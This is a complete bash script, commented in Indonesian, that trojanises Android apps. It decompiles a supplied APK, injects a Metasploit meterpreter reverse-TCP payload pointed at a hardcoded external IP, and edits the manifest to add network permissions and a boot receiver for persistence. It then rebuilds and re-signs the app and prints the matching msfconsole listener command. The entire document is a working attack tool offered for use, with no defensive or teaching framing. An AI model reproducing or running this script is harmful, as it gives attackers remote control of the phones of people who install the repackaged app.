#!/bin/bash

# =============================================
# APK BACKDOOR INJECTOR - DEBUGGED VERSION
# =============================================

# --- KONFIGURASI ---
APK_INPUT="${1:-original.apk}"
LHOST="8.215.192.205"
LPORT="4444"
WORKDIR=$(mktemp -d -p "$(pwd)" apk_work_XXXXXX)
TOOL_DIR="$HOME/.apk_tools"
LOG_FILE="apk_mod_$(date +%Y%m%d_%H%M%S).log"
KEYSTORE="$TOOL_DIR/debug.keystore"
APK_OUTPUT="${APK_INPUT%.*}_injected.apk"

# --- FUNGSI UTAMA ---

validate_environment() {
    echo "[*] Memvalidasi environment..." | tee -a "$LOG_FILE"
    
    # Cek file input
    if [ ! -f "$APK_INPUT" ]; then
        echo "[X] File APK tidak ditemukan: $APK_INPUT" | tee -a "$LOG_FILE"
        exit 1
    fi
    
    # Cek tools dasar
    for tool in apktool jarsigner zipalign keytool msfvenom; do
        if ! command -v "$tool" &>/dev/null; then
            echo "[X] Tool '$tool' tidak terinstall" | tee -a "$LOG_FILE"
            exit 1
        fi
    done
}

setup_keystore() {
    echo "[*] Menyiapkan keystore..." | tee -a "$LOG_FILE"
    mkdir -p "$TOOL_DIR"
    
    if [ ! -f "$KEYSTORE" ]; then
        keytool -genkey -v -keystore "$KEYSTORE" \
        -alias androiddebugkey -storepass android -keypass android \
        -keyalg RSA -keysize 4096 -validity 10000 \
        -dname "CN=Android Debug,O=Android,C=US" >> "$LOG_FILE" 2>&1 || {
            echo "[X] Gagal membuat keystore" | tee -a "$LOG_FILE"
            exit 1
        }
    fi
}

decompile_apk() {
    echo "[*] Mendekompilasi APK..." | tee -a "$LOG_FILE"
    
    # Hapus signature lama
    zip -d "$APK_INPUT" 'META-INF/*.SF' 'META-INF/*.RSA' 'META-INF/*.DSA' >> "$LOG_FILE" 2>&1
    
    # Dekompilasi dengan opsi minimal
    apktool d -r -s -f "$APK_INPUT" -o "$WORKDIR/original" >> "$LOG_FILE" 2>&1 || {
        echo "[X] Gagal mendekompilasi APK" | tee -a "$LOG_FILE"
        exit 1
    }
}

inject_payload() {
    echo "[*] Menyuntikkan payload..." | tee -a "$LOG_FILE"
    
    # Buat payload
    msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
    -o "$WORKDIR/payload.apk" >> "$LOG_FILE" 2>&1 || {
        echo "[X] Gagal membuat payload" | tee -a "$LOG_FILE"
        exit 1
    }
    
    # Dekompilasi payload
    apktool d -f "$WORKDIR/payload.apk" -o "$WORKDIR/payload" >> "$LOG_FILE" 2>&1
    
    # Salin smali payload
    cp -r "$WORKDIR/payload/smali/com/metasploit" "$WORKDIR/original/smali/com/" >> "$LOG_FILE" 2>&1
    
    # Modifikasi Manifest
    MANIFEST="$WORKDIR/original/AndroidManifest.xml"
    sed -i '/<application/i \
    <uses-permission android:name="android.permission.INTERNET"/> \
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>' "$MANIFEST"
    
    sed -i '/<\/application>/i \
    <service android:name="com.metasploit.stage.PayloadService" \
        android:exported="false" \
        android:permission="android.permission.BIND_JOB_SERVICE"/> \
    <receiver android:name="com.metasploit.stage.PayloadReceiver" \
        android:exported="false"> \
        <intent-filter> \
            <action android:name="android.intent.action.BOOT_COMPLETED"/> \
        </intent-filter> \
    </receiver>' "$MANIFEST"
}

build_apk() {
    echo "[*] Membangun APK baru..." | tee -a "$LOG_FILE"
    
    # Rebuild dengan aapt2
    apktool b --use-aapt2 "$WORKDIR/original" -o "$WORKDIR/unsigned.apk" >> "$LOG_FILE" 2>&1 || {
        echo "[!] Gagal build dengan aapt2, mencoba metode fallback..." | tee -a "$LOG_FILE"
        apktool b "$WORKDIR/original" -o "$WORKDIR/unsigned.apk" >> "$LOG_FILE" 2>&1 || {
            echo "[X] Gagal membangun APK" | tee -a "$LOG_FILE"
            exit 1
        }
    }
    
    # Sign APK
    jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
    -keystore "$KEYSTORE" -storepass android -keypass android \
    "$WORKDIR/unsigned.apk" androiddebugkey >> "$LOG_FILE" 2>&1 || {
        echo "[X] Gagal menandatangani APK" | tee -a "$LOG_FILE"
        exit 1
    }
    
    # Zipalign
    zipalign -f -v 4 "$WORKDIR/unsigned.apk" "$APK_OUTPUT" >> "$LOG_FILE" 2>&1 || {
        echo "[X] Gagal melakukan zipalign" | tee -a "$LOG_FILE"
        exit 1
    }
}

# --- EKSEKUSI UTAMA ---
cleanup() {
    echo "[*] Membersihkan temporary files..." | tee -a "$LOG_FILE"
    rm -rf "$WORKDIR"
}

trap cleanup EXIT

echo "=== APK INJECTOR ===" | tee -a "$LOG_FILE"
echo "[*] Target: $APK_INPUT" | tee -a "$LOG_FILE"
echo "[*] LHOST: $LHOST" | tee -a "$LOG_FILE"
echo "[*] LPORT: $LPORT" | tee -a "$LOG_FILE"

validate_environment
setup_keystore
decompile_apk
inject_payload
build_apk

echo "[+] Berhasil! APK termodifikasi: $APK_OUTPUT" | tee -a "$LOG_FILE"
echo "[*] Jalankan listener dengan:" | tee -a "$LOG_FILE"
echo "msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run'" | tee -a "$LOG_FILE"
